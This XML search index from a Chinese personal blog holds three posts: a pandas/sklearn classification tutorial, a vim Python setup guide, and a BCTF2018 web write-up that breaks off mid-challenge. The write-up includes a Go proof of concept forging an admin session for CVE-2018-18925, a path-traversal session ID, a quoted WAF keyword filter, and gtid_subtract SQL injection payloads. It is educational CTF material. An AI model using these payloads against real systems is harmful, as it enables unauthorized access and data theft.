<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[基于分类问题的数据分析与挖掘]]></title>
    <url>%2F2019%2F10%2F09%2F%E5%9F%BA%E4%BA%8E%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98%E7%9A%84%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E4%B8%8E%E6%8C%96%E6%8E%98%2F</url>
    <content type="text"><![CDATA[写在前面 转眼十月份了，这篇博客是通过完成一个分类问题的数据分析实验，从而总结了数据分析的基本过程，没有涉及很复杂的算法知识。 近况是参加了数学建模的国赛，准备考研 之后的博客会同步更新到我的知乎账号（https://www.zhihu.com/people/xiang-feng-60-30/activities）上 Iris数据集 首先，通过对Iris数据集的一系列处理，引入数据分析的简单步骤与常用方法，再进行分类实验。 项目背景鸢尾属(拉丁学名：Iris L.)，单子叶植物纲，鸢尾科多年生草本植物，开的花大而美丽， 观赏价值很高。鸢尾属约300种, Iris数据集中包含了其中的三种: 山鸢尾(Setosa), 杂色鸢尾(Versicolour)，维吉尼亚鸢尾(Virginica)，每种50个数据，共含150个数据。在每个数据包含四个属性：花萼长度，花萼宽度，花瓣长度，花瓣宽度，可通过这四个属性预测鸢尾花卉属于 (山鸢尾, 杂色鸢尾, 维吉尼亚鸢尾) 哪一类 数据集与代码：https://github.com/xiangfengw/data_analyze/tree/master/iris 数据概览 1.读取数据： 12import pandas as pddf_Iris = pd.read_csv(&apos;Iris.csv&apos;) 2.查看前五行数据： 1df_Iris.head() Id SepalLengthCm SepalWidthCm PetalLengthCm PetalWidthCm Species 0 1 5.1 3.5 1.4 0.2 Iris-setosa 1 2 4.9 3.0 1.4 0.2 Iris-setosa 2 3 4.7 3.2 1.3 0.2 Iris-setosa 3 4 4.6 3.1 1.5 0.2 Iris-setosa 4 5 5.0 3.6 1.4 0.2 Iris-setosa 其中，Id为鸢尾花编号，SepaLengthCm 为花萼长度，SepalWidthCm 为花萼宽度。PetalLengthCm 为花瓣长度, 单位，PetalWidthCm; 为花瓣宽度，Species为鸢尾花种类. 3.查看数据整体信息与统计信息 1df_Iris.info() 123456789101112Out:&lt;class &apos;pandas.core.frame.DataFrame&apos;&gt;RangeIndex: 150 entries, 0 to 149Data columns (total 6 columns):Id 150 non-null int64SepalLengthCm 150 non-null float64SepalWidthCm 150 non-null float64PetalLengthCm 150 non-null float64PetalWidthCm 150 non-null float64Species 150 non-null objectdtypes: float64(4), int64(1), object(1)memory usage: 7.1+ KB 1df_Iris.describe() Id SepalLengthCm SepalWidthCm PetalLengthCm PetalWidthCm count 150.000000 150.000000 150.000000 150.000000 150.000000 mean 75.500000 5.843333 3.054000 3.758667 1.198667 std 43.445368 0.828066 0.433594 1.764420 0.763161 min 1.000000 4.300000 2.000000 1.000000 0.100000 25% 38.250000 5.100000 2.800000 1.600000 0.300000 50% 75.500000 5.800000 3.000000 4.350000 1.300000 75% 112.750000 6.400000 3.300000 5.100000 1.800000 max 150.000000 7.900000 4.400000 6.900000 2.500000 通过以上信息我们可以得到数据集有150行，6列，其中4列为64位浮点数，1列为64位整数，1列为python对象，无缺失值，并且对四种特征值的范围也有了一定了解。 1df_Iris.describe(include=[&quot;O&quot;]).T count unique top freq Species 150 3 Iris-versicolor 50 include默认只计算数值型特征的统计量，当输入参数include=[‘O’]，会计算离散型变量的统计特征 详见官方文档 该数据集总数150，包含3个种类，最大频数为50，这里每种都为50个，因此top里的指的不是Iris-versicolor最多，而是在频数相同的基础上按照字符串长度进行排名的结果。 可以通过这样对每种进行计数: 1df_Iris.Species.value_counts() 12345Out:Iris-versicolor 50Iris-virginica 50Iris-setosa 50Name: Species, dtype: int64 特征工程（进行数据清洗与可视化）数据清理目标：去掉Species特征中的’Iris-‘前缀字符 方法： 1.使用字符串replace()方法替换 1df_Iris[&apos;Species&apos;]= df_Iris.Species.str.replace(&apos;Iris-&apos;,&apos;&apos;) 2.使用apply()方法将该列数据一个一个传递到函数中进行分割 1df_Iris[&apos;Species&apos;]= df_Iris.Species.apply(lambda x: x.split(&apos;-&apos;)[1]) apply()方法的详解可以参考官方文档 再看一下处理后的Species特征类别 12# unique()方法显示list类型的set形式，即不包含重复值df_Iris.Species.unique() 1Out:array([&apos;setosa&apos;, &apos;versicolor&apos;, &apos;virginica&apos;], dtype=object) 数据可视化这里使用基于matplotlib，与pandas紧密结合的seaborn库金水数据的可视化处理 123456789import seaborn as snsimport matplotlib.pyplot as plt#sns初始化sns.set()# 设置散点图x轴与y轴以及data参数# hue表示按照Species对数据进行分类, 而style表示每个类别的标签系列格式不一致.sns.relplot(x=&apos;SepalLengthCm&apos;, y=&apos;SepalWidthCm&apos;, hue=&apos;Species&apos;, style=&apos;Species&apos;, data=df_Iris )plt.title(&apos;SepalLengthCm and SepalWidthCm data by Species&apos;)plt.show() 数据可视化的方法与形式多种多样，这里先不进行详细介绍了。 决策树分类采用决策树算法对处理后的数据构建分类模型 12345678910111213from sklearn.model_selection import train_test_splitfrom sklearn.tree import DecisionTreeClassifierX = df_Iris[[&apos;SepalLengthCm&apos;,&apos;SepalWidthCm&apos;,&apos;PetalLengthCm&apos;,&apos;PetalWidthCm&apos;]]y = df_Iris[&apos;Species&apos;]#将数据按照8:2的比例随机分为训练集, 测试集X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2)#初始化决策树模型dt = DecisionTreeClassifier()#训练模型dt.fit(X_train, y_train)#用测试集评估模型的好坏dt.score(X_test, y_test) 以上，通过对Iris数据集的处理，了解了数据分析的简单过程，也为下一步的学习打下了基础。 宽带营销响应预测背景目前运营商对宽带客户的预测大多采用较粗放且基于统计的预测方法，但随着电信业全业务的完成，宽带客户对电信运营商的战略意义不断提升，应用新的方法研究宽带客户预测问题迫在眉睫。 基于以往客户行为数据，进行宽带营销响应预测，预测用户对我们的宽带营销是否接受，从而进行更加精确的营销。 数据集与代码：https://github.com/xiangfengw/data_analyze/tree/master/broadband_train 数据说明 变量 说明 CUST_ID 客户编码 GENDER 性别 AGE 年龄 TENURE 入网时长（月） CHANNEL 营销渠道 AUTOPAY 自动充值 ARPU_3M 近三个月总ARPU值 CALL_PARTY_CNT 通话圈人数 DAY_MOU 上午平均使用流量 AFTERNOON_MOU 下午平均使用流量 NIGHT_MOU 夜间平均使用流量 AVG_CALL_LENGTH 平均通话时长 BROADBAND 宽带营销相应 0表示不响应，1表示相应 前备知识pandas read_csv() 得到的对象是 DataFrame 对象，DataFrame 既可以作为一个通用型NumPy数组，也可以看作特殊的Python字典。如果将Series类看作带灵活索引的一维数组，那么DataFrame可以看作一个既有灵活的行索引又有灵活列名的二维数组，即若干有序排列的Series对象。 在对Series对象进行取值和切片操作时，很容易因为Series采用了整数索引而造成显式索引和隐式索引的混乱，因此Pandas提供了一些索引器（indexer）属性来作为取值的方法。它们不是Series对象的函数方法，而是暴露切片接口的属性。 第一种索引器是loc属性，表示取值和切片都是显式的（显式索引做切片时，结果包含最后一个索引） 第二种是iloc属性，表示取值和切片都是Python常规形式的隐式索引（左闭右开） 第三种取值属性是ix，它是两种索引器的混合形式，主要用于DataFrame对象。当然，DataFrame对象也可以使用前两种索引器。 查看DataFrame类的行、列名信息方法 12dfname.index.values.tolist() # 行名称dfname.columns.values.tolist() # 列名称 数据读取12import pandas as pdbroadband = pd.read_csv(&apos;broadband_train.csv&apos;, encoding=&quot;ansi&quot;) 查看一下数据的基本信息 12345broadband.head() #打印出前5行，以确保数据运行正常broadband.info()broadband.describe()broadband.shape #有多少行，多少列broadband.dtypes #查看每列的数据类型 数据清洗通过这次实验，我将数据清洗的过程总结如下： loc()方法选择子集 修改列名 缺失值处理 数据类型与格式转换 数据排序 重命名行号 异常值处理 选择子集1broadband_data = broadband.loc[:,&apos;CUST_ID&apos;:&apos;AVG_CALL_LENGTH&apos;] 得到特征集为 broadband_data 标签集为 broadband.BROADBAND 缺失值处理在数据表或 DataFrame 中有很多识别缺失值的方法。一般情况下可以分为两种：一种方法是通过一个覆盖全局的掩码表示缺失值，另一种方法是用一个标签值表示缺失值。 在掩码方法中，掩码可能是一个与原数组维度相同的完整布尔类型数组，也可能是用一个比特（0或1）表示有缺失值的局部状态。在标签方法中，标签值可能是具体的数据（例如用 -9999 表示缺失的整数）。另外，标签值还可能是更全局的值，比如用 NaN表示缺失的浮点数，它是 IEEE 浮点数规范中指定的特殊字符。 python缺失值有3种：None，NA，NaN 1）Python内置的None值 Pandas 可以使用的第一种缺失值标签是 None，它是一个 Python 单 体对象，经常在代码中表示缺失值。由于 None 是一个 Python 对 象，所以不能作为任何 NumPy / Pandas 数组类型的缺失值，只能用 于 ‘object’ 数组类型（即由 Python 对象构成的数组）： 123In: vals1 = np.array([1, None, 3, 4]) vals1Out: array([1, None, 3, 4], dtype=object) 注意：在 Python 中没有定义整数与 None 之间的运算 2）NA 3）对于数值数据，pandas使用浮点值NaN（Not a Number）表示缺失数据，会把缺失值和None自动替换为NaN。 123In: vals2 = np.array([1, np.nan, 3, 4]) vals2.dtypeOut: dtype(&apos;float64&apos;) 注意：无论和 NaN 进行何种运算操作，最终结果都是 NaN Pandas对不同类型缺失值的转换规则： 类型 缺失值转换规则 NA标签值 floating 浮点型 无变化 np.nan object 对象类型 无变化 None或np.nan integer 整数类型 强制转换为 float64 np.nan boolean 布尔类型 强制转换为 object None或np.nan 以上是python中缺失值的基本知识，在数据分析的过程中，对缺失值的处理要具体问题具体分析。因为属性缺失有时并不意味着数据缺失，缺失本身是包含信息的，所以需要根据不同应用场景下缺失值可能包含的信息进行合理填充。处理不完整数据集的方法主要有三大类：删除元组、数据补齐、不处理。 至于具体的方法分析与比较，可以通过这篇博客进行学习：数据分析中的缺失值处理 我们这次的数据集中，因为含有缺失值的行数不多，所以选择删除处理 1broadband = broadband.dropna() 数据类型与格式转换将GENDER(性别)和AUTOPAY(自动充值)两列特征值进行类型转换： GENDER：1、0代表男生、女生；AUTOPAY：1代表自动充值、0代表没有自动充值 12345678910gender = broadband.GENDER.copy()for i in broadband.index.values: gender[i] = gender[i].replace(&quot;男&quot;,&quot;1&quot;) gender[i] = gender[i].replace(&quot;女&quot;,&quot;0&quot;)autopay = broadband.AUTOPAY.copy()for i in broadband.index.values: autopay[i] = autopay[i].replace(&quot;是&quot;,&quot;1&quot;) autopay[i] = autopay[i].replace(&quot;否&quot;,&quot;0&quot;)broadband.GENDER = gender.copy()broadband.AUTOPAY = autopay.copy() 数据排序使用pd.sort_values方法对数据进行排序，by表示按那几列进行排序，ascending=True 表示升序排列，ascending=False表示降序排列 我们选择按客户编码排序 1broadband = broadband.sort_values(by=&apos;CUST_ID&apos;, ascending=True) 行号重命名在进行一系列的数据处理过程后，会发现数据的行号被打乱了，接下来我们重命名行号 1broadband = broadband.reset_index(drop=True) 异常值处理我们使用describe()方法查看统计描述信息时，如果有不符合常理的数据出现，应该进行筛选删除。 模型构建将数据集划分为训练集与测试集使用sklearn.model_selection.train_test_split可以在数据集上随机划分出一定比例的训练集和测试集 12from sklearn.model_selection import train_test_splitX_train,X_test,y_train,y_test = train_test_split(broadband_data, broadband.BROADBAND, test_size=0.2, random_state=0) 这里，我们引入交叉验证的概念 学习预测函数的参数，并在相同数据集上进行测试是一种错误的做法，这样的模型将会获得极高的分数，但对于尚未出现过的数据它则无法预测出任何有用的信息。 这种情况称为 overfitting（过拟合），为了避免这种情况，在进行（监督）机器学习实验时，通常取出部分可利用数据作为 test set（测试数据集）。 交叉验证的方法有许多，我们这里使用train_test_split()方法直接对数据集进行了划分，其他的交叉验证迭代器可以参考以下两遍博客： K折交叉验证法原理及python实现 几种交叉验证（cross validation）方式的比较 分类结果的对比标准先介绍几个概念： 精确率（Precision）:被检测出来的信息当中正确的或者相关的（也就是你想要的）信息中所占的比例； 召回率（Recall）：所有正确的信息或者相关的信息(wanted)被检测出来的比例。 tp–将正类预测为正类（true positive） fn–将正类预测为负类（false negative） fp–将负类预测为正类（false positive） tn–将负类预测为负类（true negative） 用表格表示： 正确的、相关的 不正确的、不相关的 检测出来的 TP FP 未检测出来的 FN TN 利用以上四个值可以计算Precision，Recall，F1 Scikit-Learn 提供了一些函数去计算分类器的指标，包括准确率和召回率。 123&gt;&gt;&gt; from sklearn.metrics import precision_score, recall_score&gt;&gt;&gt; precision_score(y_test, y_pred)&gt;&gt;&gt; recall_score(y_test, y_pred) 通常结合准确率和召回率会更加方便，这个指标叫做“F1 值”，特别是当你需要一个简单的方法去比较两个分类器的优劣的时候。F1 值是准确率和召回率的调和平均。普通的平均值平等地看待所有的值，而调和平均会给小的值更大的权重。所以，要想分类器得到一个高的 F1 值，需要召回率和准确率同时高。 为了计算 F1 值，简单调用f1_score() 12&gt;&gt;&gt; from sklearn.metrics import f1_score&gt;&gt;&gt; f1_score(y_test, y_pred) 网格搜索法调参机器学习算法中有两类参数：从训练集中学习到的参数，比如逻辑斯蒂回归中的权重参数，另一类是模型的超参数，也就是需要人工设定的参数，比如正则项系数，决策树的深度，随机森林中决策树的个数，人工神经网络模型中隐藏层层数和每层的节点个数，正则项中常数大小等等，他们都需要事先指定。超参数选择不恰当，就会出现欠拟合或者过拟合的问题。而在选择超参数的时候，如果手工调整超参数，做起来十分冗长，你也可能没有时间探索多种组合。 Scikit-Learn的GridSearchCV模块可以保证在指定的参数范围内找到精度最高的参数。GridSearchCV的名字其实可以拆分为两部分，GridSearch和CV，即网格搜索和交叉验证。这两个名字都非常好理解。网格搜索，搜索的是参数，即在指定的参数范围内，按步长依次调整参数，利用调整的参数训练学习器，从所有的参数中找到在验证集上精度最高的参数，这其实是一个训练和比较的过程。 需要注意的是网格搜索的评分参数scoring是可以选择的，这里我们选择为F1的值。 网格搜索虽然不错，但是穷举过于耗时，sklearn中还实现了随机搜索，使用 RandomizedSearchCV类，随机采样出不同的参数组合。 以下以决策树分类为例，对决策树的max_depth参数使用网格搜索法进行调参 12345678910from sklearn.tree import DecisionTreeClassifierfrom sklearn.model_selection import GridSearchCVimport warningswarnings.filterwarnings(&apos;ignore&apos;)param = &#123;&apos;criterion&apos;:[&apos;gini&apos;],&apos;max_depth&apos;:range(1,100,10)&#125;grid = GridSearchCV(DecisionTreeClassifier(random_state=1), param_grid=param, cv=10, scoring=&apos;f1&apos;)grid.fit(X_train, y_train)print(&apos;最优分类器:&apos;,grid.best_params_,&apos;最优分数:&apos;, grid.best_score_)print(grid.best_estimator_) best_estimator_属性可以返回调参后的最优分类器的参数模型： 123456DecisionTreeClassifier(class_weight=None, criterion=&apos;gini&apos;, max_depth=21, max_features=None, max_leaf_nodes=None, min_impurity_decrease=0.0, min_impurity_split=None, min_samples_leaf=1, min_samples_split=2, min_weight_fraction_leaf=0.0, presort=False, random_state=1, splitter=&apos;best&apos;) 这里调用warnings库是为了解决pandas的SettingWithCopyWarning警告 集成算法假设你去随机问很多人一个很复杂的问题，然后把它们的答案合并起来。通常情况下你会发现这个合并的答案比一个专家的答案要好。这就叫做群体智慧。同样的，如果你合并了一组分类器的预测（像分类或者回归），你也会得到一个比单一分类器更好的预测结果。这个技术就叫做集成学习，一个集成学习算法就叫做集成方法。 通过组合多个过拟合评估器来降低过拟合程度的想法其实是一种集成学习方法，集成学习方法使用并行评估器对数据进行有放回抽取集成，每个评估器都对数据过拟合，通过求均值可以获得更好的分类结果，而随机决策树的集成算法就是随机森林。 写在最后不同算法的调用过程博客中没有详细叙述，可以直接看代码，都是直接调用的sklearn库，所以就不写了，之后准备再详细点分别整理一下各个算法的原理和实现过程。 近期的目标 读两本一直想读的书 米兰· 昆德拉的”不能承受的生命之轻” 和李诞的”笑场” 继续学习数据分析 准备开始学习计算机组成原理 复习数据结构 （假装在）坚持背英语单词 人生其实就是寻找自己的过程，学习也是一样，当你面临选择时，会犹豫会不知所措，但就像米兰· 昆德拉在”雅克和他的主人”结尾时所说：人类最古老的笑话是，你往哪走，都是往前走。]]></content>
      <tags>
        <tag>数据分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[打造Linux下基于vim的python编辑器]]></title>
    <url>%2F2019%2F04%2F08%2F%E6%89%93%E9%80%A0Linux%E4%B8%8B%E5%9F%BA%E4%BA%8Evim%E7%9A%84python%E7%BC%96%E8%BE%91%E5%99%A8%2F</url>
    <content type="text"><![CDATA[一.前言好久没发博客了，经过一个假期的深思熟虑，我决定要考研了。虽然我还是大二，但是也要早早准备鸭。 近况是参加了数学建模和两个互联网+项目，并开始学习机器学习。 最近为了考研购置了ipad air，Notability记笔记真的好用，也想用ipad打打代码，就用Termius连接了阿里云学生服务器，把vim配置成了集标签导航、目录树导航、状态栏美化、代码提示和自动补全于一体的python编辑器，功能可谓应有尽有。 二.环境CentOS7 + vim7.4 + git1.8 + python2.7 利用 vim --version git --version 命令查询 如果缺少环境可以用yum命令安装 三.基础插件安装1.安装插件管理工具vundle安装插件之前我们用到了一个及其好用的插件管理工具vundle git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle 2.编辑.vimrc配置文件~/.vimrc是VIM的配置文件，如果这个配置文件不存在，我们可以自行创建（执行指令vi ~/.vimrc然后按i键即可 ）。安装好了vundle，需要在~/.vimrc配置文件中添加vundle支持。所以，在~/.vimrc中添加代码如下 1234567filetype offset rtp+=~/.vim/bundle/vundle/call vundle#rc() if filereadable(expand(&quot;~/.vimrc.bundles&quot;)) source ~/.vimrc.bundlesendif 3.编辑.vimrc.bundles配置文件为了方便管理插件，我们首先创建文件~/.vimrc.bundles，然后添加代码如下 ： 1234567891011121314151617181920212223242526272829303132333435if &amp;compatible set nocompatibleend filetype offset rtp+=~/.vim/bundle/vundle/call vundle#rc() &quot; Let Vundle manage VundleBundle &apos;gmarik/vundle&apos;&quot; Define bundles via Github repos&quot; 标签导航Bundle &apos;majutsushi/tagbar&apos;Bundle &apos;vim-scripts/ctags.vim&apos;&quot; 静态代码分析Bundle &apos;scrooloose/syntastic&apos;&quot; 文件搜索Bundle &apos;kien/ctrlp.vim&apos;&quot; 目录树导航Bundle &quot;scrooloose/nerdtree&quot;&quot; 美化状态栏Bundle &quot;Lokaltog/vim-powerline&quot;&quot; 主题风格Bundle &quot;altercation/vim-colors-solarized&quot;&quot; python自动补全Bundle &apos;davidhalter/jedi-vim&apos;Bundle &quot;klen/python-mode&quot;&quot; 括号匹配高亮Bundle &apos;kien/rainbow_parentheses.vim&apos;&quot; 可视化缩进Bundle &apos;nathanaelkane/vim-indent-guides&apos;if filereadable(expand(&quot;~/.vimrc.bundles.local&quot;)) source ~/.vimrc.bundles.localendiffiletype on 4.安装插件在真正执行安装命令之前，需要先安装一个叫做ctags的插件，因为tagbar依赖于ctags。安装ctags的方法为： 123456789# 下载源码wget http://prdownloads.sourceforge.net/ctags/ctags-5.6.tar.gz #解压并安装tar -zxvf ctags-5.6.tar.gz cd ctags-5.6 ./configure &amp;&amp; make &amp;&amp; make install 我们已经指定好了各个插件的路径，接下里就是安装各个插件了。在shell中输入vim，进入命令行模式输入BundleInstall（也就是在VI的插入模式下，按键ESC，然后输入 :BundleInstall）。 运行这个命令就开始自行安装我们之前指定的各个插件了。这个过程需要连网，下载并安装好各个插件之后会提示Done！注意一定要等待每个插件全部安装好后最下方啊的提示行提示Done才退出vim。 四.插件配置已经安装好了各个插件，接下里就可以直接用了吗？答案是否定的，我们还需要继续对自己安装的插件进行配置。配置这里也很简单，下面是我的配置，更新~/.vimrc为： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384filetype offset rtp+=~/.vim/bundle/vundle/call vundle#rc()if filereadable(expand(&quot;~/.vimrc.bundles&quot;)) source ~/.vimrc.bundlesendif&quot; tagbar标签导航nmap &lt;Leader&gt;tb :TagbarToggle&lt;CR&gt;let g:tagbar_ctags_bin=&apos;/usr/bin/ctags&apos;let g:tagbar_width=30autocmd BufReadPost *.cpp,*.c,*.h,*.hpp,*.cc,*.cxx call tagbar#autoopen()let g:jedi#auto_initialization = 1&quot; 主题 solarizedlet g:solarized_termtrans=1let g:solarized_contrast=&quot;normal&quot;let g:solarized_visibility=&quot;normal&quot;&quot; 配色方案set background=darkset t_Co=256colorscheme solarized&quot; 目录文件导航NERD-Tree&quot; \nt 打开nerdree窗口，在左侧栏显示nmap &lt;leader&gt;nt :NERDTree&lt;CR&gt;let NERDTreeHighlightCursorline=1let NERDTreeIgnore=[ &apos;\.pyc$&apos;, &apos;\.pyo$&apos;, &apos;\.obj$&apos;, &apos;\.o$&apos;, &apos;\.so$&apos;, &apos;\.egg$&apos;, &apos;^\.git$&apos;, &apos;^\.svn$&apos;, &apos;^\.hg$&apos; ]let g:netrw_home=&apos;~/bak&apos;&quot;close vim if the only window left open is a NERDTreeautocmd bufenter * if (winnr(&quot;$&quot;) == 1 &amp;&amp; exists(&quot;b:NERDTreeType&quot;) &amp;&amp; b:NERDTreeType == &quot;primary&quot;) | q | end&quot; ctrlp文件搜索&quot; 打开ctrlp搜索let g:ctrlp_map = &apos;&lt;leader&gt;ff&apos;let g:ctrlp_cmd = &apos;CtrlP&apos;&quot; 相当于mru功能，show recently opened filesmap &lt;leader&gt;fp :CtrlPMRU&lt;CR&gt;&quot; set wildignore+=*/tmp/*,*.so,*.swp,*.zip &quot; MacOSX/Linux&quot;let g:ctrlp_custom_ignore = &#123; \ &apos;dir&apos;: &apos;\v[\/]\.(git|hg|svn|rvm)$&apos;, \ &apos;file&apos;: &apos;\v\.(exe|so|dll|zip|tar|tar.gz)$&apos;, \ &#125;&quot;\ &apos;link&apos;: &apos;SOME_BAD_SYMBOLIC_LINKS&apos;,let g:ctrlp_working_path_mode=0let g:ctrlp_match_window_bottom=1let g:ctrlp_max_height=15let g:ctrlp_match_window_reversed=0let g:ctrlp_mruf_max=500let g:ctrlp_follow_symlinks=1&quot; vim-powerline美化状态&quot; let g:Powerline_symbols = &apos;fancy&apos;let g:Powerline_symbols = &apos;unicode&apos;&quot; 括号匹配高亮let g:rbpt_colorpairs = [ \ [&apos;brown&apos;, &apos;RoyalBlue3&apos;], \ [&apos;Darkblue&apos;, &apos;SeaGreen3&apos;], \ [&apos;darkgray&apos;, &apos;DarkOrchid3&apos;], \ [&apos;darkgreen&apos;, &apos;firebrick3&apos;], \ [&apos;darkcyan&apos;, &apos;RoyalBlue3&apos;], \ [&apos;darkred&apos;, &apos;SeaGreen3&apos;], \ [&apos;darkmagenta&apos;, &apos;DarkOrchid3&apos;], \ [&apos;brown&apos;, &apos;firebrick3&apos;], \ [&apos;gray&apos;, &apos;RoyalBlue3&apos;], \ [&apos;black&apos;, &apos;SeaGreen3&apos;], \ [&apos;darkmagenta&apos;, &apos;DarkOrchid3&apos;], \ [&apos;Darkblue&apos;, &apos;firebrick3&apos;], \ [&apos;darkgreen&apos;, &apos;RoyalBlue3&apos;], \ [&apos;darkcyan&apos;, &apos;SeaGreen3&apos;], \ [&apos;darkred&apos;, &apos;DarkOrchid3&apos;], \ [&apos;red&apos;, &apos;firebrick3&apos;], \ ]let g:rbpt_max = 40let g:rbpt_loadcmd_toggle = 0&quot; 可视化缩进let g:indent_guides_enable_on_vim_startup = 0 &quot; 默认关闭let g:indent_guides_guide_size = 1 &quot; 指定对齐线的尺寸let g:indent_guides_start_level = 2 &quot; 从第二层开始可视化显示缩进set ts=4set expandtabset autoindent&quot; 运行文件map &lt;F5&gt; :w&lt;cr&gt;:r!python %&lt;cr&gt; 你可以根据自己的喜好设置快捷键，是按键\，根据我的配置。在VIM的正常模式下： 依次按键\tb，就会调出标签导航； 依次按键\ff，就会调出文件搜索； 依次按键\nt，就会调出目录导航。 在VIM的正常模式下，按F5就会保存文件并使用python3运行当前文件，并将结果输出到当前界面。运行完之后，依然可以在VIM的正常模式下按u，撤回这个输出操作，这样输出结果就撤回了，我们就可以继续编写自己的代码了。 五.遇到的问题与解决方案以上教程中python自动补全插件我安装后运行没有成功，所以自己另外找了个自动补全python代码的插件，步骤如下： 安装 12cd ~/.vim/bundlegit clone https://github.com/rkulla/pydiction.git 官方的步骤说明： Put python_pydiction.vim in ~/.vim/after/ftplugin/Create this directory if doesn’t yet exist. Vim looks there automatically 意思是把下载的pydiction文件夹中的python_pydiction.vim文件（这个文件在/pydiction/after/ftplugin/目录下）移动到 ~/.vim/afer/ftplugin/目录下，这是vim实现该功能的默认目录，如果没有这个目录就手动创建一下。 在 ~/.vimrc配置文件中追加如下代码 123filetype plugin onlet g:pydiction_location = &apos;~/.vim/bundle/pydiction/complete-dict&apos;let g:pydiction_menu_height = 3 六.总结网上的教程有很多不适合我，磕磕绊绊终于配置好了vim的python编译器，经过这些步骤之后相信你对vim插件的管理已经有了清晰的认识，也可以寻找并添加新的插件来完善自己的编辑器了。]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BCTF2018-web(1)]]></title>
    <url>%2F2018%2F12%2F03%2FBCTF2018-web-1%2F</url>
    <content type="text"><![CDATA[前言总结一下BCTF2018的解题过程，这篇博客只有其中三道题，包括但不仅限于gogs框架的任意用户登录漏洞、SQL报错注入、XSS。 虽然自己做的时候都没做出来，但在看wp的过程中回顾自己的思路时，从中发现了自己的思路偏在哪里了，有哪些从前没想过的切入点。 checkin输入一个不存在的url，看到404报错，提示： Powered by beego 1.7.2 思路是老大提供的 关于gitea/gogs的CVE-2018-18925/6任意用户登录/代码执行漏洞 go-macaron(https://github.com/go-macaron/session version&lt;0.4.0) beego(https://github.com/astaxie/beego version&lt;1.11.0) 都存在这个问题，p神的vulhub中也有这个洞的docker：CVE-2018-18925 以文件存储session，且sessionid没有过滤./的时候导致可以用任意文件作为session 所以这道题可以在头像上传处上传伪造的session文件，再用sessionid包含即可伪造身份为admin 这里不能使用之前的poc构造session文件了，要改一下，我当时做题时就不知道怎么改，现在学到了一些思路。 先上传一个0B的图片，把session设置成该地址，登陆后下载头像，解析其中的字段类型，发现两项 12UID intusername string 可以直接改CVE-2018-18925的poc为 123456789101112131415161718192021222324252627282930313233package mainimport ( &quot;bytes&quot; &quot;encoding/gob&quot; &quot;encoding/hex&quot; &quot;fmt&quot; &quot;io/ioutil&quot;)func EncodeGob(obj map[interface&#123;&#125;]interface&#123;&#125;) ([]byte, error) &#123; for _, v := range obj &#123; gob.Register(v) &#125; buf := bytes.NewBuffer(nil) err := gob.NewEncoder(buf).Encode(obj) return buf.Bytes(), err&#125;func main() &#123; var uid int64 = 1 obj := map[interface&#123;&#125;]interface&#123;&#125;&#123;&quot;username&quot;: &quot;admin&quot;, &quot;UID&quot;: uid&#125; data, err := EncodeGob(obj) if err != nil &#123; fmt.Println(err) &#125; err = ioutil.WriteFile(&quot;test2.png&quot;, data, 0777) if err != nil &#123; fmt.Println(err) &#125; edata := hex.EncodeToString(data) fmt.Println(edata)&#125; 跑完poc得到一段十进制数据 放到CyberChef的From HEX功能中，存个poc.jpg 上传poc.jpg后修改sessionid为上传的返回地址../../../../../../go/src/github.com/checkin/website/static/img/avatar/xxxxxxx.png，登陆到admin用户，访问Admin Panel得到flag babySQLiSPA这道题我第一眼看了以为是二次注入，然后在二次注入的路上越走越远，直到这道题官方的hint给了waf。 注册用户名的时候发现限定了[a-zA-Z0-9]，把其它的都过滤了， 所以没法二次注入了。 r3kapig的writeup中提到，在看网页源码时发现是用webpack打包的，用webpack打包过后会生成.map文件，于是访问main.dfa730c5.js.map，在其中可以发现两个没有用到的api： searchHints中用到的captcha就是从getCaptcha中得到的，于是： /api/hints可以注入，且报错回显。 看一下给的WAF 123export function checkHint (hint) &#123; return ! / |;|\+|-|\*|\/|&lt;|&gt;|~|!|\d|%|\x09|\x0a|\x0b|\x0c|\x0d|`|gtid_subset|hash|json|st\_|updatexml|extractvalue|floor|rand|exp|json_keys|uuid_to_bin|bin_to_uuid|union|like|sleep|benchmark/ig.test(hint)&#125; 使用报错函数gtid_subtract()绕过 hints:&#39;or(gtid_subtract((select(group_concat(table_name))from(information_schema.tables)where((table_schema=database()))),&#39;&#39;))or&#39; 但发现返回的表名都是乱码，因为GTID_SUBTRACT()的报错信息有长度限制，最多140字节，Nu1L是限制表名长度来提取的，长度为30的时候拿到flag表”vhEFfFlLlLaAAaaggIiIIsSSHeReEE “ payload：hint=&#39;or(gtid_subtract((select(group_concat(table_name))from(information_schema.tables)where((length(table_name)=ord(&#39;j&#39;)^ord(&#39;t&#39;)))),&#39;&#39;))or&#39; 这里也可以引入reverse()函数倒序查看表名 然后再爆列名：hint=&#39;||gtid_subtract((select(concat(column_name))from(information_schema.columns)where(table_name=&#39;vhEFfFlLlLaAAaaggIiIIsSSHeReEE&#39;)),&#39;&#39;)# 报错信息：{&quot;error&quot;:&quot;Malformed GTID set specification &#39;ZSLRSrpOlCCysnaHUqCEIjhtWbxbMlDkUO&#39;.&quot;} 最后的payload：hints:&#39;||gtid_subtract((select(ZSLRSrpOlCCysnaHUqCEIjhtWbxbMlDkUO)from(vhEFfFlLlLaAAaaggIiIIsSSHeReEE)),&#39;&#39;)#. 这道题主要没想到sql注入的位置，学习了一种报错注入用的函数。 SEAFARING1做这道题时发现login处有个XSS，之前没做过XSS的题，登陆的时候需要验证码，也没发现有什么用。 还有一个robots.txt提示文件： 12User-agent: *Disallow: /admin/handle_message.php view-source:http://seafaring.xctf.org.cn:9999/admin可以看到后台的部分源码： 1234567891011121314151617181920212223242526function view_uid(uid) &#123; $.ajax(&#123; type: &quot;POST&quot;, url: &quot;/admin/handle_message.php&quot;, data: &#123;&quot;token&quot;: csrf_token, &quot;action&quot;: &quot;view_uid&quot;, &quot;uid&quot;: uid&#125;, dataType: &quot;json&quot;, success: function (data) &#123; if (!data[&quot;error&quot;]) &#123; data = data[&apos;result&apos;]; var Status = &apos;&apos;; $(&apos;#timestamp&apos;).text(data[&apos;timestamp&apos;]); 